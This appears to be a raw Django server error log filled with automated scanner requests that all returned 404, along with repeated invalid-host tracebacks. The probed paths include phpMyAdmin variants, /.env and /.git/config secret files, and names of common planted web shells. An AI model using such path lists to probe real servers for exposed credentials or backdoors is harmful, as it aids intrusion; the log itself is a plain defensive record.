Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /db/dbweb/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /pma/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /phppma/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /.git/config
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /api.json
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /.env
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /libs/js/iframe.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /chosen.php
Not Found: /administrator/web/index.php
Not Found: /index.php
Not Found: /mysqladmin/index.php
Not Found: /sqlmanager/index.php
Not Found: /dbadmin/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /mysql/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /administrator/admin/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /db/dbweb/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /mysql/pMA/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /db/webdb/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /phppma/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /database/index.php
Not Found: /mysql/web/index.php
Not Found: /myadmin/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /phpmy-admin/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /db/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /mysql/db/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /db/db-admin/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /pma/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /mysql-admin/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /mysql/admin/index.php
Not Found: /phpmy/index.php
Not Found: /sql/webdb/index.php
Not Found: /administrator/db/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /MyAdmin/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /sql/myadmin/index.php
Not Found: /PMA/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /mysqlmanager/index.php
Not Found: /administrator/pma/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /phpmyadmin/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /shopdb/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /db/myadmin/index.php
Not Found: /sql/webadmin/index.php
Not Found: /db/webadmin/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /php-myadmin/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /db/websql/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /sql/websql/index.php
Not Found: /sql/sql/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /program/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /php-my-admin/index.php
Not Found: /administrator/PMA/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /mysql/sqlmanager/index.php
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /geju.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp.php
Not Found: /hoot.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /system.ini
Not Found: /setup.cgi
Not Found: /index.html
Not Found: //.env
Not Found: /robots.txt
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /robots.txt
Not Found: /robots.txt
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /wp-content/themes/index.php
Not Found: /wp-includes/index.php
Not Found: /about/function.php
Not Found: /wp-trackback.php
Not Found: /cgi-bin/index.php
Not Found: /bak.php
Not Found: /text.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /simple.php
Not Found: /wp-admin/includes/index.php
Not Found: /wp-content/index.php
Not Found: /as.php
Not Found: /link.php
Not Found: /makeasmtp.php
Not Found: /404.php
Not Found: /wp-admin/images/about.php
Not Found: /wp-admin/wp-login.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-admin/network/plugins.php
Not Found: /wp-includes/SimplePie/wp-login.php
Not Found: /autoload_classmap.php
Not Found: /wp-includes/blocks/about.php
Not Found: /about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /radio.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /dropdown.php
Not Found: /.well-known/index.php
Not Found: /.well-known/acme-challenge/plugins.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/certificates/plugins.php
Not Found: /alfanew.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp-admin/css/index.php
Not Found: /file.php
Not Found: /mah.php
Not Found: /wp-includes/ID3/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /images/plugins.php
Not Found: /wp-includes/admin.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/autoload_classmap.php
Not Found: /test.php
Not Found: /chosen.php
Not Found: /wp-content/about.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /wp-content/autoload_classmap.php
Not Found: /files/index.php
Not Found: /wp-admin/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /css/index.php
Not Found: /byp.php
Not Found: /wp-admin/includes/about.php
Not Found: /cong.php
Not Found: /wp-content/upgrade/index.php
Not Found: /wp-admin/css/wp-login.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-admin/user/index.php
Not Found: /.well-known/admin.php
Not Found: /wp-includes/pomo/plugins.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-content/themes/sketch/404.php
Not Found: /wp-includes/about.php
Not Found: /function.php
Not Found: /.well-known/pki-validation/index.php
Not Found: /.well-known/radio.php
Not Found: /wp-admin/network/index.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-content/themes/about.php
Not Found: /xmrlpc.php
Not Found: /.well-known/acme-challenge/index.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /readme.php
Not Found: /.well-known/wp-login.php
Not Found: /upload.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/images/plugins.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/cong.php
Not Found: /index.php
Not Found: /wp-configs.php
Not Found: /wp-content/file.php
Not Found: /wp-includes/fonts/plugins.php
Not Found: /wp-admin/user/plugins.php
Not Found: /wp-content/themes.php
Not Found: /wp-content/themes/plugins.php
Not Found: /public/makeasmtp.php
Not Found: /wp-info.php
Not Found: /wp-mail.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-content/themes/admin.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /cgi-bin/plugins.php
Not Found: /wp-admin/user/cloud.php
Not Found: /themes.php
Not Found: /wp-signup.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.git/index
Not Found: /sitemaps.xml
Not Found: /contact.html
Not Found: /sitemaps.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /xmlrpc.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /.git/HEAD
Not Found: /.env
Not Found: /index.html
Not Found: /contact/contact.html
Not Found: /libs/js/iframe.js
Not Found: /shell
Not Found: /sql/phpmanager/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /sql/webadmin/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /sql/websql/index.php
Not Found: /mysql-admin/index.php
Not Found: /program/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /PMA/index.php
Not Found: /db/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /sqlmanager/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /mysql/db/index.php
Not Found: /administrator/web/index.php
Not Found: /mysql/pma/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /administrator/admin/index.php
Not Found: /mysql/admin/index.php
Not Found: /mysql/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /dbadmin/index.php
Not Found: /index.php
Not Found: /sql/sql/index.php
Not Found: /mysqlmanager/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /db/db-admin/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /myadmin/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /mysql/web/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /administrator/db/index.php
Not Found: /administrator/PMA/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /db/myadmin/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /db/dbadmin/index.php
Not Found: /db/dbweb/index.php
Not Found: /php-myadmin/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /mysql/pMA/index.php
Not Found: /php-my-admin/index.php
Not Found: /sql/myadmin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /MyAdmin/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /db/webdb/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /pma/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /phpmyadmin/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /administrator/pma/index.php
Not Found: /phppma/index.php
Not Found: /database/index.php
Not Found: /phpmy/index.php
Not Found: /db/webadmin/index.php
Not Found: /shopdb/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /phpmy-admin/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /db/websql/index.php
Not Found: /sql/webdb/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /mysqladmin/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /actuator/gateway/routes
Not Found: /.git/refs/
Not Found: /actuator/health
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /www/.git/config
Not Found: /.env
Not Found: /.env.dev.local
Not Found: /files/.git/config
Not Found: /dev/.git/config
Not Found: /.env.bak
Not Found: /.env.preprod
Not Found: /.env.uat
Not Found: /SDK/webLanguage
Not Found: /robots.txt
Not Found: /portal/redlion
Not Found: /SDK/webLanguage
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sdk
Not Found: /odinhttpcall1739170852
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /evox/about
Not Found: /HNAP1
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /solr/admin/info/system
Not Found: /cgi-bin/authLogin.cgi
Not Found: /query
Not Found: /v2/_catalog
Not Found: /solr/admin/cores
Not Found: /.git/refs/heads/
Not Found: /.env
Not Found: /robots.txt
Not Found: /config.json
Not Found: /robots.txt
Not Found: /wp-content/plugins/wp-ver.php
Not Found: /wp-content/plugins/wp-ver.php
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /robots.txt
Invalid HTTP_HOST header: '112.124.42.80:63435'. You may need to add '112.124.42.80' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '112.124.42.80:63435'. You may need to add '112.124.42.80' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /hello.world
